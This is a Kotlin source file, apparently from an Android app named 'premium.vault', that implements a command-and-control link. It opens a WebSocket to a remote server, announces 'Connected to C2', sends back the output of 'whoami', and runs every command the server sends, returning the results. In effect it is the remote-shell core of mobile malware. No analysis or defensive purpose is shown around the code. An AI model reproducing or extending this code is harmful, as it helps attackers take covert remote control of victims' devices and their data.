package com.premium.vault

import android.util.Log
import okhttp3.*
import java.util.concurrent.TimeUnit

class Connection(private val url: String) {
    private val client = OkHttpClient.Builder().readTimeout(0, TimeUnit.MILLISECONDS).build()

    fun connect() {
        val request = Request.Builder().url(url).build()
        client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d("Vault", "Connected to C2")
                // Send a ping to let you know it's alive
                webSocket.send(Commands.execute("whoami"))
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                // Execute the command received from Telegram
                val output = Commands.execute(text)
                webSocket.send(output)
            }
        })
    }
}
